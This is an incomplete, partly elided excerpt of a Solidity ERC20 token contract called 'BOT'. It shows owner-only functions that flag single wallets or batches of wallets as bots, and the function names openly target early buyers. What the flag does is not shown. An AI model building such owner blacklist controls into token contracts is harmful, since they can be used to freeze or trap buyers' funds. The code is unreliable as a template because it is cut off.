...
contract BOT is ERC20, Ownable {
    ...
    constructor() ERC20(unicode"𝗕𝗼𝘁", unicode"𝗕𝗼𝘁") {
    ...
    function BoughtEarlyGetRekt(address wallet, bool flag) external onlyOwner {
        bot[wallet] = flag;
    }

    function massBoughtEarlyGetRekt(address[] calldata wallets, bool flag) external onlyOwner {
